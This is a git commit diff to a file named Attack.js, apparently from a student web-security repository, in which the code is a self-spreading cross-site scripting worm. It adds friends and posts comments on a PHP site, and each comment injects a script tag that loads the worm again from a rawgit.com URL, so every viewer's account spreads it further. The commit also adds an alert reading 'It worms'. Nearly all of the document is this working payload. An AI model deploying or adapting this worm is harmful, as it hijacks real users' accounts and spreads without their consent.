ffac719d1751afaff18086fd81e6e2e9a4518ace
JonLMyers <jlm4508@g.rit.com>
2016-11-29 18:49:35 -0500

    fixed?

--- Attack.js
+++ Attack.js
@@ -1,4 +1,3 @@
-<script>
 function fight(){
   $.get("add_friend.php?id=114");
   $.get('add_comment.php?id=114&comment='.concat(Date()));
@@ -9,9 +8,9 @@ function fight(){
     var a = 'add_comment.php?id='.concat(id);
     var b = '&comment=<script type="text/javascript" src="https://rawgit.com/JonLMyers/WebSecurity/master/Attack.js">').concat('<\/script>');
     $.get(a+b);
+    alert("It worms");
     });
 }
 fight();
-</script>
 //<script type="text/javascript" src="https://rawgit.com/JonLMyers/WebSecurity/master/Attack.js"></script>
 //https://drive.google.com/host/0B_BwSrIRFmFza01yWEV3aWQ2eHM
